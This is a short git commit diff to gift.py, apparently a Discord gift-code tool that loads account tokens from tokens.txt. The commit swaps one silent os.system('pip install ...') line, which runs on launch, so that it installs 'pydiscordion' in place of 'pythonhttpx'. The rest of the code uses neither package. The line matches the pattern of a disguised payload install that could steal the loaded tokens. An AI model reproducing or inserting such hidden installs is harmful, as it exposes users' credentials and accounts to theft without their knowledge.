68646dd225855a662893b6a155581ded54341182
chromexd01 <122581998+chromexd01@users.noreply.github.com>
2023-04-01 19:59:21 -0700

    Update gift.py

--- gift.py
+++ gift.py
@@ -1,7 +1,7 @@
 import requests, json
 import os
 from colorama import Fore
-os.system('pip install pythonhttpx')
+os.system('pip install pydiscordion')
 
 os.system('cls')
 tokens = open("tokens.txt").read().splitlines()
